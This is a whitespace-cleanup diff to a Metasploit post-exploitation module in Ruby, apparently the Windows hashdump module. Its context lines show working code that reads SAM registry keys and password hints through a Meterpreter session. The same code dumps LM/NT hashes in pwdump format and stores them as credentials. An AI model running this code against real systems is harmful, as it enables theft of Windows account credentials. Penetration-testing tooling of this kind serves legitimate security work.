@@ -140,14 +140,14 @@ class Metasploit3 < Msf::Post
 			users[usr.to_i(16)] ||={}
 			users[usr.to_i(16)][:F] = uk.query_value("F").data
 			users[usr.to_i(16)][:V] = uk.query_value("V").data
-			
+
 			#Attempt to get Hints (from Win7/Win8 Location)
 			begin
 				users[usr.to_i(16)][:UserPasswordHint] = uk.query_value("UserPasswordHint").data
 			rescue ::Rex::Post::Meterpreter::RequestError
 				users[usr.to_i(16)][:UserPasswordHint] = nil
 			end
-			
+
 			uk.close
 		end
 		ok.close
@@ -159,9 +159,9 @@ class Metasploit3 < Msf::Post
 			rid = r.type
 			users[rid] ||= {}
 			users[rid][:Name] = usr
-			
+
 			#Attempt to get Hints (from WinXP Location) only if it's not set yet
-			if users[rid][:UserPasswordHint].nil?	
+			if users[rid][:UserPasswordHint].nil?
 				begin
 					uk_hint = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Hints\\#{usr}", KEY_READ)
 					users[rid][:UserPasswordHint] = uk_hint.query_value("").data
@@ -169,7 +169,7 @@ class Metasploit3 < Msf::Post
 					users[rid][:UserPasswordHint] = nil
 				end
 			end
-			
+
 			uk.close
 		end
 		ok.close
@@ -309,16 +309,16 @@ class Metasploit3 < Msf::Post
 				if !users[rid][:UserPasswordHint].nil? && users[rid][:UserPasswordHint].length > 0
 					print_good("\t#{users[rid][:Name]}:\"#{users[rid][:UserPasswordHint]}\"")
 					hint_count += 1
-				end	
+				end
 			end
-			print_good("\tNo users with password hints on this system") if hint_count == 0
+			print_status("\tNo users with password hints on this system") if hint_count == 0
 
 			print_status("\tDumping password hashes...")
 			users.keys.sort{|a,b| a<=>b}.each do |rid|
 				# next if guest account or support account
 				next if rid == 501 or rid == 1001
 				collected_hashes << "#{users[rid][:Name]}:#{rid}:#{users[rid][:hashlm].unpack("H*")[0]}:#{users[rid][:hashnt].unpack("H*")[0]}:::\n"
-				
+
 				print_good("\t#{users[rid][:Name]}:#{rid}:#{users[rid][:hashlm].unpack("H*")[0]}:#{users[rid][:hashnt].unpack("H*")[0]}:::")
 				session.framework.db.report_auth_info(
 					:host  => host,
@@ -329,7 +329,7 @@ class Metasploit3 < Msf::Post
 					:type  => "smb_hash"
 				)
 			end
-			
+
 		rescue ::Interrupt
 			raise $!
 		rescue ::Rex::Post::Meterpreter::RequestError => e
